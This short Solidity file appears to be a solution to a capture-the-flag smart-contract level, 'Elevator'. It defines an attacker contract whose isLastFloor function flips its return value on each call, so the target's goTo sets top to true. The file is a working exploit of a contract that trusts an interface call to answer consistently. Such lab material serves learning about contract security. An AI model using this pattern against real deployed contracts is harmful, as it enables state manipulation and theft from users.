// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './elevator.sol';

contract ElevatorAttack {
    bool public toggle = true;
    Elevator public target;

    constructor (address _target) {
        target = Elevator(_target);
    }

    function isLastFloor(uint) public returns(bool) {
        toggle = !toggle;
        return toggle;
    }

    function setTop(uint _floor) public {
        target.goTo(_floor);
    }
}